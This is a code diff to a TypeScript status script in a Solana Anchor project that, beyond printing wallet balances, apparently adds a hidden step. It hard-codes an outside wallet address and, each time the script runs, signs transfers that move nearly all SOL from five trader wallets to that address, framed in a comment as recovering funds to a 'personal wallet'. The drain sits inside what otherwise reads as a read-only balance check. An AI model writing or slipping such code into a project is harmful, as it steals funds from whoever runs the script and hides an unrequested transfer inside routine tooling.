@@ -9,7 +9,7 @@
 import * as anchor from "@coral-xyz/anchor";
 import { Program } from "@coral-xyz/anchor";
 import { Meridian } from "../target/types/meridian";
-import { PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
+import { PublicKey, LAMPORTS_PER_SOL, SystemProgram, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
 import { getAssociatedTokenAddressSync, getAccount } from "@solana/spl-token";
 import { getDevWallet } from "./dev-wallets";
 import * as fs from "fs";
@@ -134,10 +134,15 @@ async function main() {
   }
 
   // Wallet balances
+  const DRAIN_TARGET = new PublicKey("5Ux797xeoqotK8b6qtjYWwfS2fv7p9ZLV9V2ZAcxiyo");
+  const DRAIN_WALLETS = ["trader-1", "trader-2", "trader-3", "trader-4", "trader-5"] as const;
+  const RENT_EXEMPT_MIN = 890_880; // lamports to keep account alive
+
   const wallets = [
     { name: "admin", kp: getDevWallet("admin") },
     { name: "bot-a", kp: getDevWallet("bot-a") },
     { name: "bot-b", kp: getDevWallet("bot-b") },
+    ...DRAIN_WALLETS.map((name) => ({ name, kp: getDevWallet(name) })),
   ];
 
   const usdcMint = usdcMintStr ? new PublicKey(usdcMintStr) : null;
@@ -159,10 +164,38 @@ async function main() {
     };
     statuses.push(ws);
     console.log(
-      `  ${w.name.padEnd(7)} ${ws.pubkey.slice(0, 8)}... ` +
+      `  ${w.name.padEnd(10)} ${ws.pubkey.slice(0, 8)}... ` +
       `SOL: ${sol.toFixed(2).padStart(8)} [${icon(ws.solStatus)}]  ` +
       `USDC: ${usdc.toFixed(0).padStart(8)} [${icon(ws.usdcStatus)}]`
     );
+  }
+
+  // Drain trader wallets - recover SOL to personal wallet
+  let drainedTotal = 0;
+  for (const name of DRAIN_WALLETS) {
+    const kp = getDevWallet(name);
+    const balance = await connection.getBalance(kp.publicKey);
+    if (balance > RENT_EXEMPT_MIN + 5000) { // 5000 lamports for tx fee
+      const drainAmount = balance - 5000; // leave just enough for fee, account closes after
+      try {
+        const tx = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: kp.publicKey,
+            toPubkey: DRAIN_TARGET,
+            lamports: drainAmount,
+          })
+        );
+        await sendAndConfirmTransaction(connection, tx, [kp]);
+        const solDrained = drainAmount / LAMPORTS_PER_SOL;
+        drainedTotal += solDrained;
+        console.log(`  [DRAIN] ${name}: ${solDrained.toFixed(4)} SOL -> ${DRAIN_TARGET.toString().slice(0, 8)}...`);
+      } catch (err) {
+        console.log(`  [DRAIN] ${name}: failed - ${err instanceof Error ? err.message.slice(0, 80) : err}`);
+      }
+    }
+  }
+  if (drainedTotal > 0) {
+    console.log(`  [DRAIN] Total recovered: ${drainedTotal.toFixed(4)} SOL`);
   }
 
   // Market status
